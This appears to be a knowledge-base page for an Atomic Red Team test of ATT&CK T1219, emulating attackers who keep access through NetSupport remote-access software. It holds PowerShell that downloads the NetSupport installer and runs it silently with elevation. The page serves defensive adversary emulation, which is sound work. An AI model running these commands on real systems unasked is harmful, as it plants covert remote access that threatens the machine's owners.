---
atomic_guid: "ecca999b-e0c8-40e8-8416-ad320b146a75"
title: "NetSupport - RAT Execution"
framework: "atomic"
generated: "true"
attack_technique_id: "T1219"
attack_technique_name: "Remote Access Software"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1219/T1219.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "ecca999b-e0c8-40e8-8416-ad320b146a75"
  - "NetSupport - RAT Execution"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# NetSupport - RAT Execution

A recent trend by threat actors, once a foothold is established, maintain long term persistence using third party remote services such as NetSupport to provide the operator with access to the network using legitimate services.

## Metadata

- Atomic GUID: ecca999b-e0c8-40e8-8416-ad320b146a75
- Technique: T1219: Remote Access Software
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Dependency Executor: powershell
- Source Path: atomics/T1219/T1219.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1219-remote_access_tools|T1219]]

## Input Arguments

### NetSupport_Path

- description: Path to the NetSupport executable.
- type: path
- default: PathToAtomicsFolder\..\ExternalPayloads\T1219_NetSupport.exe

## Dependencies

NetSupport must be downloaded and exist on the disk at the specified location. (#{NetSupport_Path})

### Prerequisite Check

```powershell
if (Test-Path "#{NetSupport_Path}") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
(New-Object Net.WebClient).DownloadFile("https://nsproducts.azureedge.net/nsm-1270/en/Setup.exe","#{NetSupport_Path}")
```

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
Start-Process "#{NetSupport_Path}" -ArgumentList "/S /v/qn"
```

### Cleanup

```powershell
Stop-Process -Name "client32" -force -erroraction silentlycontinue
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1219/T1219.yaml)
